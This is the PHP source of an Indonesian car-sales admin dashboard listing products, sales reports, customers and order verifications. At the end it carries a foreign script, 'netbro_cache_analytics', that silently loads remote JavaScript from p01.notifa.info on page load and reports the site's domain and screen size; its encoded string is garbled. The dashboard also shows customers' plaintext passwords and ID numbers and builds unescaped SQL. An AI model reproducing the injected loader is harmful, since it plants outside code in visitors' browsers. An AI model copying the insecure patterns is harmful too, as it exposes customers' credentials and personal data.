<?php
session_start();
include '../core/core.php';

if (!isset($_SESSION['username'])) {
  header("Location: ../admin/login.php?access_denied");
}
?>

<!DOCTYPE html>
<html lang="en" class="no-js">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Beli Mobil - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="favicon.ico">

  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
  <!-- /This styles needs for demo -->

  <link rel="stylesheet" href="../admin/css/bootstrap.min.css">
  <link rel="stylesheet" href="./css/bootstrap-datepicker.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <style>
  #customers {
    font-family: Arial, Helvetica, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  #customers td,
  #customers th {
    border: 1px solid #ddd;
    padding: 8px;
  }

  #customers tr:nth-child(even) {
    background-color: #f2f2f2;
  }

  #customers tr:hover {
    background-color: #ddd;
  }

  #customers th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: left;
    background-color: #04AA6D;
    color: white;
  }


  .ct {
    font-family: Arial, Helvetica, sans-serif;
    border-collapse: collapse;
    width: 100%;
  }

  .ct td,
  #customers th {
    border: 1px solid #ddd;
    padding: 8px;
  }

  .ct tr:nth-child(even) {
    background-color: #f2f2f2;
  }

  .ct tr:hover {
    background-color: #ddd;
  }

  .ct th {
    padding-top: 12px;
    padding-bottom: 12px;
    text-align: left;
    background-color: #04AA6D;
    color: white;
  }




  .prizebutton {
    display: block;
    width: 100px;
    height: 100px;
    font-size: 1.3em;
    font-weight: light;
    font-family: 'Trebuchet MS', sans-serif;
    text-transform: uppercase;
    text-align: center;
    line-height: 100px;
    letter-spacing: -1px;
    color: white;
    border: none;
    border-radius: 50%;
    background: #5a99d4;
    cursor: pointer;
    box-shadow: 0 0 0 0 rgba(#5a99d4, .5);
    -webkit-animation: pulse 1.5s infinite;
  }

  .prizebutton span {
    color: #e2eaf3;
    position: absolute;
    text-decoration: none;
    text-align: center;
    font-weight: bold;
    font-size: 1.2rem;
    line-height: .8;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }
  </style>


  <script>
  (function(i, s, o, g, r, a, m) {
    i['GoogleAnalyticsObject'] = r;
    i[r] = i[r] || function() {
      (i[r].q = i[r].q || []).push(arguments)
    }, i[r].l = 1 * new Date();
    a = s.createElement(o),
      m = s.getElementsByTagName(o)[0];
    a.async = 1;
    a.src = g;
    m.parentNode.insertBefore(a, m)
  })(window, document, 'script', '../../../../www.google-analytics.com/analytics.js', 'ga');

  ga('create', 'UA-96534204-1', 'auto');
  ga('send', 'pageview');
  </script>

  <script src="../js/jquery-3.3.1.js"></script>
  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/modernizr.custom.js"></script>
</head>

<body>
  <!-- Modal -->
  <div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Kirim Hadiah ke Pemenang</h5>
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">


          <form id="formKirimHadiah">
            <div class="form-group">
              <input type="text" class="form-control" id="idPemenang" disabled hidden>
            </div>
            <div class="form-group">
              <label for="idBarangHadiah">Hadiah</label>
              <select id="idBarangHadiah" class="form-control">
                <option selected>Pilih hadiah...</option>
                <?php
                $sql = "SELECT * FROM barang_hadiah";
                $query = mysqli_query($connect, $sql);
                while ($data = mysqli_fetch_array($query)) {
                ?>
                <option value="<?= $data['id'] ?>"><?= $data['nama_barang'] ?></option>
                <?php
                }
                ?>
              </select>
            </div>
            <div class="form-group">
              <div class="form-check">
                <input hidden class="form-check-input" type="checkbox" id="isKirimEmail">
                <label hidden class="form-check-label" for="gridCheck">
                  Kirim Email pemberitahuan ke pemenang
                </label>
              </div>
            </div>
            <button type="submit" class="btn btn-primary">Kirim Hadiah</button>
          </form>
        </div>
      </div>
    </div>
  </div>
  <!-- Loading animation -->
  <div class="preloader">
    <div class="preloader-animation">
      <div class="dot1"></div>
      <div class="dot2"></div>
    </div>
  </div>
  <!-- /Loading animation -->

  <div id="page" class="page">
    <!-- Header -->
    <header id="site_header" class="header mobile-menu-hide header-color-light">
      <div class="my-photo tilt-effect">
        <img src="../images/photo.png" alt="image">
      </div>

      <div class="site-title-block">
        <h1 class="site-title">Beli Mobil</h1>
      </div>

      <!-- Navigation -->
      <div class="site-nav">
        <!-- Main menu -->
        <ul id="nav" class="site-main-menu">
          <li>
            <a class="pt-trigger" href="#home" data-animation="21"><i
                class="menu-icon pe-7s-icon pe-7s-home"></i>Halaman Utama</a>
          </li>
          <li>
            <a class="pt-trigger" href="#verifikasi" data-animation="17"><i
                class="menu-icon pe-7s-icon pe-7s-info"></i>Verifikasi</a>
          </li>

          <li>
            <a class="pt-trigger" href="#verifikasi2" data-animation="17"><i
                class="menu-icon pe-7s-icon pe-7s-info"></i>Laporan Penjualan</a>
          </li>

          <li>
            <a class="pt-trigger" href="#barang" data-animation="17"><i
                class="menu-icon pe-7s-icon pe-7s-box1"></i>Mobil</a>
          </li>
          </li>

          <li>
            <a class="pt-trigger" href="#pesan" data-animation="17"><i
                class="menu-icon pe-7s-chat pe-7s-info"></i>Pesan</a>
          </li>
          <li>
            <a class="pt-trigger" href="#pelanggan" data-animation="17"><i
                class="menu-icon pe-7s-person pe-7s-info"></i>Pelanggan</a>
          </li>
        </ul>
        <!-- /Main menu -->
      </div>
      <!-- Navigation -->
    </header>
    <!-- /Header -->

    <!-- Mobile Header -->
    <div class="mobile-header mobile-visible">
      <div class="mobile-logo-container">
        <div class="mobile-site-title">Beli Mobil</div>
      </div>

      <a class="menu-toggle mobile-visible">
        <i class="fa fa-bars"></i>
      </a>
    </div>
    <!-- /Mobile Header -->

    <!-- Main Content -->
    <div id="main" class="site-main">
      <!-- Page changer wrapper -->
      <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
        <!-- Subpages -->
        <div class="subpages">

          <!-- Home Subpage -->
          <section class="pt-page pt-page-1 section-without-bg section-paddings-0 table" data-id="home">
            <div class="section-inner">
              <div class="home-page-block">
                <h2>Beli Mobil</h2>
                <div class="owl-carousel text-rotation">
                  <div class="item">
                    <p class="home-page-description">Ya disini...</p>
                  </div>
                  <div class="item">
                    <p class="home-page-description">Mudah dan Cepat</p>
                  </div>
                </div>
              </div>
            </div>
          </section>
          <!-- End of Home Subpage -->

          <!-- About Me Subpage -->
          <section class="pt-page pt-page-2" data-id="barang">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Barang</h2>
                  <h5 class="section-description">Informasi Barang</h5>
                </div>
              </div>

              <script type="text/javascript">
              $(document).ready(function() {
                $('#datatable').DataTable();

                //Buttons examples
                var table = $('#datatable-buttons').DataTable({
                  lengthChange: false,
                  buttons: ['copy', 'excel', 'pdf']
                });

                table.buttons().container()
                  .appendTo('#datatable-buttons_wrapper .col-md-6:eq(0)');
              });
              </script>

              <div class="row">

                <div class="col-12">
                  <div class="card-box table-responsive">
                    <a href="../admin/page-brg.php"
                      class="pull-right btn btn-inverse btn-sm waves-effect waves-light">Add</a>
                    <table id="datatable-buttons" class='ct' cellspacing="0" width="100%">
                      <?php if (isset($_GET['status'])) : ?>
                      <p>
                        <?php
                          if ($_GET['status'] == 'sukses') {
                            echo "Tambah data baru berhasil!";
                          } else {
                            echo "Tambah data gagal!";
                          }
                          ?>
                      </p>
                      <?php endif; ?>
                      <thead>
                        <tr>
                          <th>No</th>
                          <th>Nama Resmi Produk</th>
                          <th>Harga</th>
                          <th>Kategori</th>
                          <th>Stok</th>
                          <th>Kode</th>

                        </tr>
                      </thead>
                      <tbody>
                        <?php
                        $no = 0;
                        $sql = "SELECT * FROM barang";
                        $query = mysqli_query($connect, $sql);
                        while ($data = mysqli_fetch_array($query)) {
                          $no++;
                          $harga = $data['harga'];
                          echo "<tr>";
                          echo "<td>" . $no . "</td>";
                          echo "<td>" . $data['nama_produk'] . "</td>";
                          echo "<td>" . $data['harga'] . "</td>";
                          echo "<td>" . $data['kategori'] . "</td>";
                          echo "<td>" . $data['stok'] . "</td>";
                          echo "<td>" . $data['kode_barang'] . "</td>";
                          echo "</tr>";
                        }
                        ?>
                      </tbody>

                      </td>
                      </tr>
                      </tfoot>
                    </table>

                  </div>
                </div>
                <!-- </div> -->
                <!-- end row -->
          </section>
          <!-- End of About Me Subpage -->

          <section class="pt-page pt-page-2" data-id="verifikasi2">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Laporan</h2>
                  <h5 class="section-description">Laporan Barang</h5>
                </div>
              </div>
              <a href="javascript:window.print()"> Cetak</a>
              <h3>Laporan Penjualan </h3>
              <table id=customers>
                <tr>
                  <th>Nama Produk </th>
                  <th>Harga </th>
                  <th>Kategori </th>
                  <th>Tipe </th>
                  <th>Terjual </th>
                  <th>Tahun Penjualan </th>
                </tr>

                <?php
                $r = mysqli_query($connect, "SELECT b.nama_produk, b.harga, b.kategori, b.tipe, IFNULL(tb2.terjual,0) AS terjual, YEAR(tb2.Tgl) AS tahun_penjualan FROM barang b LEFT JOIN (SELECT COUNT(qty) AS terjual, kode_barang, Tgl FROM jual GROUP BY kode_barang) AS tb2 USING(kode_barang);");
                while ($w = mysqli_fetch_array($r)) {
                  echo "
                <tr>
                    <td>$w[nama_produk] </td>
                    <td>$w[harga] </td>
                    <td>$w[kategori] </td>
                    <td>$w[tipe] </td>
                    <td>$w[terjual] </td>
                    <td>$w[tahun_penjualan] </td>
                </tr>";
                }
                ?>
              </table>

              <div class="row justify-content-center my-3">
                <a class="btn btn-primary pt-trigger" href="#detail-penjualan" data-animation="3">Detail Laporan
                  Barang</a>
              </div>
            </div>

            <!-- </div> -->
            <!-- end row -->
          </section>
          <!-- End of About Me Subpage -->

          <!-- Detail Penjualan Subpage -->
          <section class="pt-page pt-page-2" data-id="detail-penjualan">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Laporan</h2>
                  <h5 class="section-description">Detail Laporan Barang</h5>
                </div>
              </div>

              <div class="row">
                <div class="col">
                  <h3>Detail Laporan Penjualan </h3>
                </div>
                <div class="col-lg-4">
                  <div class="input-group mb-3">
                    <div class="input-group mb-3">
                      <div class="input-group-prepend">
                        <label class="input-group-text" for="inputGroupSelect01">Pencarian</label>
                      </div>
                      <input type="text" class="form-control" name="datepicker" id="myInput" />
                    </div>
                  </div>
                </div>
              </div>
              <div id="tabel-penjualan-container">
                <table id=customers>
                  <thead>
                    <tr>
                      <th>Nama Produk </th>
                      <th>Harga </th>
                      <th>Kategori </th>
                      <th>Tipe </th>
                      <th>Tahun Penjualan </th>
                    </tr>
                  </thead>

                  <tbody id="tabel-penjualan">
                    <?php
                    $r = mysqli_query($connect, "SELECT b.nama_produk, b.harga, b.kategori, b.tipe, j.Tgl FROM barang b RIGHT JOIN jual j USING(kode_barang);");
                    while ($w = mysqli_fetch_array($r)) {
                      echo "
                    <tr>
                    <td>$w[nama_produk] </td>
                    <td>$w[harga] </td>
                    <td>$w[kategori] </td>
                    <td>$w[tipe] </td>
                    <td>$w[Tgl] </td>
                    </tr>";
                    }
                    ?>
                  </tbody>
                </table>
                <script>
                $(document).ready(function() {
                  $("#myInput").on("keyup", function() {
                    var value = $(this).val().toLowerCase();
                    $("#tabel-penjualan tr").filter(function() {
                      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
                    });
                  });
                });
                </script>
              </div>
            </div>
          </section>
          <!-- End of Detail Penjualan Subpage -->

          <section class="pt-page pt-page-2" data-id="pelanggan">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Pelanggan</h2>
                  <h5 class="section-description">Informasi Pelanggan</h5>
                </div>
              </div>

              <div class="row justify-content-center">
                <div class="col-12 text-center">
                  <h1 id="pemenang-giveaway"></h1>
                </div>
              </div>

              <div class="row">
                <div class="col-12">
                  <div class="table-responsive">
                    <table class="table">
                      <thead class="thead-dark">
                        <tr>
                          <th>No</th>
                          <th>NIK</th>
                          <th>Nama</th>
                          <th>Alamat</th>
                          <th>Tgl Lahir</th>
                          <th>Email</th>
                          <th>Username</th>
                          <th>Password</th>
                          <th>Phone</th>
                          <th>Aksi</th>
                        </tr>
                      </thead>

                      <tbody style="overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">
                        <?php
                        $no = 0;
                        $sql = "SELECT * FROM user";
                        $query = mysqli_query($connect, $sql);

                        while ($data = mysqli_fetch_array($query)) {
                          $no++;
                          echo "<tr>";
                          echo "<td>" . $no . "</td>";
                          echo "<td>" . $data['nik'] . "</td>";
                          echo "<td>" . $data['nama'] . "</td>";
                        ?>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['alamat'] ?></td>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['tgl_lahir'] ?></td>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['email'] ?></td>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['username'] ?></td>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['password'] ?></td>
                        <td style="overflow:hidden; text-overflow:ellipsis"><?= $data['phone'] ?></td>
                        <?php

                          echo "<td>";
                          echo "<a href='page-edit-user.php?id=" . $data['id'] . "'> Edit </a> |";
                          echo "<a href='delete-user.php?id=" . $data['id'] . "'> Hapus </a>";
                          echo "</td>";
                          echo "</tr>";
                        }
                        ?>
                      </tbody>
                    </table>
                  </div>

                  <div class="col-12 d-flex justify-content-center mt-3">
                    <div class="prizebutton-container">
                      <button id="prizebutton" class="prizebutton">
                        <div class="circle"></div>
                        <span>Undi Pemenang</span>
                      </button>
                    </div>
                  </div>
                </div>
                <!-- </div> -->
                <!-- end row -->
          </section>
          <!-- End of About Me Subpage -->

          <!-- /Page changer wrapper -->

          <!-- About Me Subpage -->
          <section class="pt-page pt-page-2" data-id="verifikasi">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Verifikasi</h2>
                  <h5 class="section-description">Verifikasi Barang</h5>
                </div>
              </div>

              <script type="text/javascript">
              $(document).ready(function() {
                $('#datatable2').DataTable();

                //Buttons examples
                var table = $('#datatable2-buttons').DataTable({
                  lengthChange: false,
                  searching: true,
                  buttons: ['copy', 'excel', 'pdf']
                });

                table.buttons().container()
                  .appendTo('#datatable2-buttons_wrapper .col-md-6:eq(0)');
              });
              </script>

              <div class="row">

                <div class="col-12">
                  <div class="card-box table-responsive">
                    <a href="javascript:window.print()"> Cetak</a>

                    <table id="datatable2-buttons" class="ct" cellspacing="0" width="100%">
                      <?php if (isset($_GET['status'])) : ?>
                      <p>
                        <?php
                          if ($_GET['status'] == 'sukses') {
                            echo "Tambah data baru berhasil!";
                          } else {
                            echo "Tambah data gagal!";
                          }
                          ?>
                      </p>
                      <?php endif; ?>
                      <thead>

                        <tr>
                          <th>
                            <center>No
                          </th>
                          <th>
                            <center>Cek
                          </th>
                          <th>
                            <center>Nama
                          </th>
                          <th>
                            <center>Nama Produk
                          </th>
                          <th>
                            <center>Status
                          </th>
                          </center>
                          <th colspan=3>
                            <center>Aksi
                          </th>
                          </center>
                        </tr>
                      </thead>

                      <tbody>
                        <?php
                        $no = 0;
                        $sql = "SELECT * FROM verifikasi";
                        $query = mysqli_query($connect, $sql);

                        while ($data = mysqli_fetch_array($query)) {
                          $no++;
                          $status = $data['status'];

                          if ($status == "Diterima") {

                            $m = cari($connect, "select * from jual where id ='$data[id]' ");

                            if (empty($m)) {
                              mysqli_query($connect, "insert into jual set  
                                                                IDJual ='$data[id]',
                                                                id ='$data[id]',
                                                                kode_barang ='$data[kode_barang]',
                                                                qty         ='$data[qty]',
                                                                tgl         =curdate()
                                                
                                ");

                              mysqli_query($connect, "update barang set stok = stok - '$data[qty]'  where kode_barang ='$data[kode_barang]'");
                            }
                          }

                        ?>
                        <tr>
                          <td><?= $no ?> </td>
                          <td><a href='../user/images/<?= $data['Bukti'] ?>' class='btn btn-success'>Cek Transfer</a>
                          </td>
                          <td><?= $data['nama'] ?></td>
                          <td><?= $data['nama_produk'] ?></td>
                          <td><?= $data['status'] ?></td>
                          <td>
                            <form action="../admin/terima-pesanan.php" method="post">
                              <input type="hidden" name="id" value="<?= $data['id'] ?>">
                              <input type="submit" name="tr" value="Terima">
                            </form>
                          </td>
                          <td>
                            <form action="../admin/tolak-pesanan.php" method="post">
                              <input type="hidden" name="id" value="<?= $data['id'] ?>">
                              <input type="submit" name="tk" value="Tolak">
                            </form>
                          </td>
                          <td>
                            <form action="../admin/hapus-pesanan.php" method="post">
                              <input type="hidden" name="id" value="<?= $data['id'] ?>">
                              <input type="submit" name="hp" value="Hapus">
                            </form>
                          </td>
                        </tr>
                        <?php } ?>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
              <!-- </div> -->
              <!-- end row -->
          </section>
          <!-- End of About Me Subpage -->


          <!-- About Me Subpage -->
          <section class="pt-page pt-page-2" data-id="pesan">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper clearfix">
                  <h2 class="section-title">Pesan</h2>
                  <h5 class="section-description">Pesan Masuk</h5>
                </div>
              </div>

              <div class="row">

                <?php
                $no = 0;
                $sql = "SELECT * FROM pesan";
                $query = mysqli_query($connect, $sql);

                while ($data = mysqli_fetch_array($query)) {
                  $no++;
                  $pesan = $data['name'];

                  echo "<div class='col-sm-6 col-md-6 col-lg-4'>";
                  echo "<div class='timeline-event te-primar'>";
                  echo "<h5 class='event-date'>" . $no . "</h5>";
                  echo "<h4 class='event-name'>" . $data['name'] . "</h4>";
                  echo "<span class='event-description'>" . $data['email'] . "</span>";
                  echo "<p>" . $data['message'] . "</p>";
                  echo "<a href='delete-psn.php?id=" . $data['id'] . "'>Hapus</a>";
                  echo "</br>";

                  echo "</div>";
                  echo "</div>";
                }
                ?>
              </div>
              <!-- End of Services block -->
            </div>
          </section>
          <!-- End of About Me Subpage -->

          <!-- </div> -->
        </div>

        <!-- laporan -->


        <div class="row">

          <div class="col-12" style='display:none;'>
            <div class="card-box table-responsive" id=cetak>
              <table id="datatable2-buttons" class="ct" cellspacing="0" width="100%">

                <thead>

                  <tr>
                    <th>No</th>
                    <th>Nama</th>
                    <th>Nama Produk</th>
                    <th>Status</th>

                  </tr>
                </thead>

                <tbody>
                  <?php
                  $no = 0;
                  $sql = "SELECT * FROM verifikasi";
                  $query = mysqli_query($connect, $sql);

                  while ($data = mysqli_fetch_array($query)) {
                    $no++;
                    $status = $data['status'];
                  ?>
                  <tr>
                    <td><?= $no ?> </td>

                    <td><?= $data['nama'] ?></td>
                    <td><?= $data['nama_produk'] ?></td>
                    <td><?= $data['status'] ?></td>

                  </tr>
                  <?php } ?>
                </tbody>

                </td>
                </tr>
                </tfoot>
              </table>

            </div>
          </div>
          <!-- </div> -->
          <!-- end row -->
          </section>


        </div>

        <!-- batas laporan -->


        <!-- /Main Content -->
      </div>

      <!-- Demo Color changer -->
      <a id="lm_demo_panel_switcher" class="lm-demo-panel-switcher right"><i class="fa fa-gear"></i></a>
      <div id="lm_demo_panel" class="lm-demo-panel right panel-color-red active">
        <div class="demo-panel-title">Selamat datang!</div>
        <div class="demo-panel-title">
          <?php echo $_SESSION['username']; ?></div>
        <div id="header_position" class="demo-panel-options mobile-hidden">

          <a href="../admin/logout.php" class="layout-switcher" data-id="layout-menu-bottom">
            <div class="preview layout bottom">Keluar</div>
          </a>
        </div>

      </div>

      <!-- Required datatable js -->
      <script src="../plugins/datatables/jquery.dataTables.min.js"></script>
      <script src="../plugins/datatables/dataTables.bootstrap4.min.js"></script>
      <!-- Buttons examples -->
      <script src="../plugins/datatables/dataTables.buttons.min.js"></script>
      <script src="../plugins/datatables/buttons.bootstrap4.min.js"></script>
      <script src="../plugins/datatables/jszip.min.js"></script>
      <script src="../plugins/datatables/pdfmake.min.js"></script>
      <script src="../plugins/datatables/vfs_fonts.js"></script>
      <script src="../plugins/datatables/buttons.html5.min.js"></script>
      <script src="../plugins/datatables/buttons.print.min.js"></script>
      <script src="../plugins/datatables/buttons.colVis.min.js"></script>
      <!-- Responsive examples -->
      <script src="../plugins/datatables/dataTables.responsive.min.js"></script>
      <script src="../plugins/datatables/responsive.bootstrap4.min.js"></script>


      <!-- /Demo Color changer -->
      <script src="../js/bootstrap.js"></script>
      <script src="../js/bootstrap.min.js"></script>
      <script src="../js/bootstrap-datepicker.js"></script>
      <script src="../js/pages-switcher.js"></script>
      <script src="../js/imagesloaded.pkgd.min.js"></script>
      <script src="../js/validator.js"></script>
      <script src="../js/jquery.shuffle.min.js"></script>
      <script src="../js/masonry.pkgd.min.js"></script>
      <script src="../js/owl.carousel.min.js"></script>
      <script src="../js/jquery.magnific-popup.min.js"></script>
      <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
      <script src="../js/tilt.jquery.min.js"></script>
      <script src="../js/jquery.hoverdir.js"></script>
      <script src="../js/main.js"></script>

      <!-- datepicker -->
      <script>
      function getLaporanPenjualan(year) {
        $.ajax({
          type: "POST",
          url: "detail-laporan",
          data: {
            year
          },
          success(res) {
            console.log(res);
          }
        })
      }

      const dp = $("#datepicker").datepicker({
        format: "yyyy",
        viewMode: "years",
        minViewMode: "years",
        autoclose: true //to close picker once year is selected
      });

      dp.on("changeYear", function(e) {
        setTimeout(() => {
          const year = $('#datepicker').val()
          const data = getLaporanPenjualan(year)
          $('#tabel-penjualan-container').children("table").html(data.toString())
        }, 1);
      })
      </script>

      <!-- Undi Giveaway -->
      <script>
      $("#prizebutton").click(function() {
        $.ajax({
          type: 'GET',
          url: 'undi-giveaway',
          data: {
            ajax: 1,
          },
          success(res) {
            console.log(res);
            const exPerson = ["Budi", "Dimas", "Agung", "Devi", "Lala", "Arif", "Rahmat", "Dina", "Lina",
              "Adel"
            ]
            const randomize = setInterval(() => {
              $('#pemenang-giveaway').text(exPerson[Math.round(Math.random() * 10)])
            }, 50)

            setTimeout(() => {
              clearInterval(randomize)
              $('#pemenang-giveaway').text(res.nama)
              $('#idPemenang').val(res.id)
              setTimeout(() => {
                $('#exampleModal').modal('show')
              }, 1000);
            }, 3000);
          }
        })
      })
      </script>

      <script>
      $('#formKirimHadiah').submit(function(e) {
        $.ajax({
          type: "POST",
          url: 'kirim-hadiah',
          dataType: "json",
          data: {
            idUser: $('#idPemenang').val(),
            idBarangHadiah: $('#idBarangHadiah').val(),
            isKirimEmail: document.getElementById('isKirimEmail').checked
          },
        })

        $('#exampleModal').modal('hide')

        setTimeout(() => {
          alert("Berhasil")
        }, 500);
      })
      </script>

      <!-- Demo Color changer Script -->
      <script src="../preview/lmpixels-demo-panel.js"></script>
      <!-- /Demo Color changer Script -->
      <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
            4 TtHaUQnUEiP6K % 2 fc5C582NzYpoUazw5mVa2K % 2 bNZnlpTXt9YnUCwpMMLx % 2 b %
            2 bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq % 2 bGxts8680ZPIfGcjWoyu1MUIXmG % 2 b %
            2 fgsc13iDQgNwbvkNzcl % 2 bgd5G365lc % 2 fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ %
            2 b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH % 2 bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe %
            2 beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt %
            2 fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT % 2 bA3GpgWz0UZBVqoJQUQTafmPPjQfmo % 2 bujydoTzM %
            2 b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY % 2 ftUBTyzxtnHSs6iYj1qOwVzMd4cpc %
            2 fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG % 2 bXplJfh1lkgP45Ezt % 2 b7MOHgoActEOLtw + "&idc_r=" + idc_glo_r +
            "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };
      </script>
</body>

</html>